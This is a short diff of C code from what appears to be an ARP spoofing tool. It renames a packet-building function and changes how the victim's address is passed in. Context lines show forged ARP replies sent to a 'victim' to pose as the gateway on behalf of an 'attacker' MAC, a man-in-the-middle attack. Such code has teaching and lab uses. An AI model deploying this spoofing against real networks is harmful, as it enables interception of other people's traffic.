@@ -1,6 +1,6 @@
 #include "core.h"
 
-ether_arp build_ether_arp(
+ether_arp init_ether_arp(
     int op,
     Mac target_mac,
     u32 target_addr_hl,
@@ -29,7 +29,7 @@ void broadcast_arp_request(
     u32 source_addr_hl,
     Mac source_mac
 ) {
-    ether_arp req = build_ether_arp(
+    ether_arp req = init_ether_arp(
         ARPOP_REQUEST,
         BROADCAST_MAC,
         target_addr_hl,
@@ -123,10 +123,9 @@ void init_arp_spoof_args(
     ARPSpoofArgs* arp_spoof_args,
     char* if_name,
     int arp_sock,
-    char* victim_addr_str,
+    u32 victim_addr_hl,
     int spoof_period_sec
 ) {
-    u32 victim_addr_hl = inet_addr(victim_addr_str);
     Mac attacker_mac = get_interface_mac(if_name);
     u32 gateway_addr_hl = get_gateway_addr_hl(if_name);
 
@@ -167,7 +166,7 @@ void send_arp_spoof(
     u32 victim_ip
 ) {
     sockaddr_ll addr_ll = get_arp_sockaddr_ll(if_name, victim_mac);
-    ether_arp spoof = build_ether_arp(
+    ether_arp spoof = init_ether_arp(
         ARPOP_REPLY, victim_mac, victim_ip, attacker_mac, gateway_ip
     );
 
